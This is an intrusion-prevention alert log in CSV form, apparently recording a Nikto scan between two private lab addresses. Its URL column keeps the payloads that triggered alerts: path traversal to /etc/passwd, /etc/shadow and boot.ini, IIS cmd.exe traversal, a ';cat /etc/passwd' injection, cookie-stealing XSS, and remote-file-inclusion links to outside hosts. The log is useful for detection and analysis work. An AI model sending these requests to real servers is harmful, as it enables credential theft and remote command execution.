attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
44780,7613667,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50946,80,ips,signature,/logfile.htm
44780,7613667,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50946,80,ips,signature,-
44780,7613668,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50948,80,ips,signature,/restricted/
44780,7613668,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50948,80,ips,signature,-
44780,7613669,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50950,80,ips,signature,/WebShop/logs/cc.txt
43336,7613669,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50950,80,ips,signature,/etc/passwd
44780,7613669,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50950,80,ips,signature,-
44780,7613670,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50952,80,ips,signature,/decsdoc.nsf
44780,7613670,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50952,80,ips,signature,-
44780,7613671,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,/stsrc.nsf
10604,7613671,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,/boilerplate.asp?NFuse_Template=../../boot.ini&amp;NFuse_CurrentFolder=/SSLx0020Directories|-|0|404_Object_Not_Found
12459,7613671,1,medium,csPassword.CommandUsage,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,/csPassword.cgi?command=remove%20
43336,7613671,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,/etc/shadow+
44780,7613671,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,-
10604,7613672,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd
43336,7613672,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra.asp?n=../../../../../../../../../etc/passwd
44780,7613672,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra.asp?n=/.\\\
24975,7613672,1,medium,HTTP.Malformed.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra_professionnel.asp?n=/....../boot.ini
10604,7613672,3,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,-
43336,7613672,10,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,-
44780,7613672,3,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,-
43336,7613673,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50958,80,ips,signature,/forum.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613674,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50960,80,ips,signature,/forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613675,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50962,80,ips,signature,/forum.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613676,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50964,80,ips,signature,/forum.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613677,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50966,80,ips,signature,/forum.asp?n=/../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613678,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50968,80,ips,signature,/forum.asp?n=/../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613679,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50970,80,ips,signature,/forum.asp?n=/.\\\
43336,7613680,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50972,80,ips,signature,/forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613681,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50974,80,ips,signature,/forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613682,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50976,80,ips,signature,/forum.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
44780,7613683,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum/mainfile.php
43336,7613683,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
10604,7613683,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
24975,7613683,1,medium,HTTP.Malformed.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1.asp?n=1753&amp;nn=/....../boot.ini
30908,7613683,1,medium,Oxide.WebServer.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/....../boot.ini
44780,7613683,17,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,-
43336,7613683,26,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,-
10604,7613683,12,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,-
24975,7613683,1,medium,HTTP.Malformed.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,-
30908,7613683,1,medium,Oxide.WebServer.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,-
43336,7613684,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50980,80,ips,signature,/forum_arc.asp?n=../../../../../../../../../etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613685,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50982,80,ips,signature,/forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613686,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50984,80,ips,signature,/forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613687,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50986,80,ips,signature,/forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613688,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50988,80,ips,signature,/forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613689,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50990,80,ips,signature,/forum_arc.asp?n=/.\\\
43336,7613690,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50992,80,ips,signature,/forum_arc.asp?n=/etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613691,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50994,80,ips,signature,/forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613692,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50996,80,ips,signature,/forum_arc.asp?n=268
43336,7613693,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50998,80,ips,signature,/forum_professionnel.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
44780,7613692,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50996,80,ips,signature,-
10604,7613694,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51000,80,ips,signature,/forum_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613695,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51002,80,ips,signature,/forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613696,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51004,80,ips,signature,/forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613697,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51006,80,ips,signature,/forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613698,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51008,80,ips,signature,/forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613699,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51010,80,ips,signature,/forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613700,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51012,80,ips,signature,/forum_professionnel.asp?n=/.\\\
43336,7613701,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51014,80,ips,signature,/forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613702,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51016,80,ips,signature,/forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613703,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51018,80,ips,signature,/forum_professionnel.asp?n=100
44780,7613703,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51018,80,ips,signature,-
44780,7613704,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,/functions.inc.php+
12699,7613704,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,/helperfunction.php?includedir=http://cirt.net/rfiinc.txt?
43336,7613704,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,/imprimer.asp?no=%60/etc/passwd%60|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
44780,7613704,7,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,-
12699,7613704,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,-
10604,7613705,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51022,80,ips,signature,/imprimer.asp?no=....//....//....//....//....//....//....//etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613706,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51024,80,ips,signature,/imprimer.asp?no=../../../../../../../../../etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613707,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51026,80,ips,signature,/imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613708,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51028,80,ips,signature,/imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613709,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51030,80,ips,signature,/imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613711,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51034,80,ips,signature,/imprimer.asp?no=/.\\\
43336,7613713,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51038,80,ips,signature,/imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613710,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51032,80,ips,signature,/imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613712,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51036,80,ips,signature,/imprimer.asp?no=/etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613714,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51040,80,ips,signature,/imprimer.asp?no=c:\\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
44780,7613715,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/include/customize.php
17702,7613715,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20
43336,7613715,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd
12699,7613715,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F
10604,7613715,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd
24975,7613715,1,medium,HTTP.Malformed.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/modif_infos.asp?n=/....../boot.ini
44780,7613715,64,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,-
43336,7613715,5,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,-
10604,7613715,2,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,-
44780,7613716,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51044,80,ips,signature,/protection.php
43336,7613716,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51044,80,ips,signature,/rubrique.asp?no=%60/etc/passwd%60|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
44780,7613716,5,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51044,80,ips,signature,-
10604,7613717,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51046,80,ips,signature,/rubrique.asp?no=....//....//....//....//....//....//....//etc.passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613718,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51048,80,ips,signature,/rubrique.asp?no=../../../../../../../../../etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613719,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51050,80,ips,signature,/rubrique.asp?no=/....../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613720,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51052,80,ips,signature,/rubrique.asp?no=/.../.../.../.../.../.../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
10604,7613721,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51054,80,ips,signature,/rubrique.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613722,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51056,80,ips,signature,/rubrique.asp?no=/../../../../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613723,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51058,80,ips,signature,/rubrique.asp?no=/../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613724,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51060,80,ips,signature,/rubrique.asp?no=/.\\\
43336,7613725,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51062,80,ips,signature,/rubrique.asp?no=/etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7613726,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51064,80,ips,signature,/rubrique.asp?no=/etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7613727,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51066,80,ips,signature,/rubrique.asp?no=c:\\boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
44780,7613728,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/screen.php
56270,7613728,1,high,Generic.Path.Traversal.Detection,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/scripts/tradecli.dll?template=nonexistfile?template=..\\..\\..\\..\\..\\winnt\\system32\\cmd.exe?/c+dir
43336,7613728,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/shoutbox/expanded.php?conf=../../../../../../../etc/passwd%20
12648,7613728,1,medium,HTPasswd.Access,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/.htpasswd
14088,7613728,1,medium,HTTP.GET.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,////../../data/config/microsrv.cfg
44780,7613728,74,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,-
43336,7613728,2,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,-
43336,7613729,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51070,80,ips,signature,////////../../../../../../etc/passwd
44780,7613730,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,/_vti_bin/shtml.exe/_vti_rpc
12979,7613730,1,medium,Administrators.PWD,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,/_vti_pvt/administrators.pwd
44780,7613730,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,-
12979,7613730,2,medium,Administrators.PWD,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,-
44780,7613731,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51074,80,ips,signature,/examples/forward1
44780,7613731,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51074,80,ips,signature,-
44780,7613732,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51076,80,ips,signature,/index.html.ru.cp866
13116,7613732,1,low,IISsamples.ISSamples.Access,HTTP,172.16.1.2,172.16.2.2,51076,80,ips,signature,/iissamples/issamples/codebrws.asp
44780,7613732,25,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51076,80,ips,signature,-
13116,7613732,2,low,IISsamples.ISSamples.Access,HTTP,172.16.1.2,172.16.2.2,51076,80,ips,signature,-
44780,7613733,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,/icons/
17702,7613733,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,/forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&what=\\\
10604,7613733,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini
43336,7613733,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,/mylog.html?screen=/etc/passwd
44780,7613733,42,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,-
17702,7613733,8,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,-
43336,7613733,4,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,-
44780,7613734,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/cfide/administrator/index.cfm
43336,7613734,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/directory.php?dir=%3Bcat%20/etc/passwd
17702,7613734,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>
13056,7613734,1,low,Fpcount.Access,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/_vti_bin/fpcount.exe
10604,7613734,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/shop/normal_html.cgi?file=../../../../../../etc/issue%00
12933,7613734,1,medium,ExAir.Search.ASP.Access,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/iissamples/exair/search/advsearch.asp
44780,7613734,62,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,-
43336,7613734,12,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,-
17702,7613734,16,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,-
10604,7613734,3,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,-
17702,7613735,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/acart2_0/error.asp?msg=<script>alert(\\\
12015,7613735,1,high,MS.IIS.Web.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/certsrv/..%c0%af../winnt/system32/cmd.exe?/c+dir
50825,7613735,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
44780,7613735,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/acart2_0/acart2_0.mdb
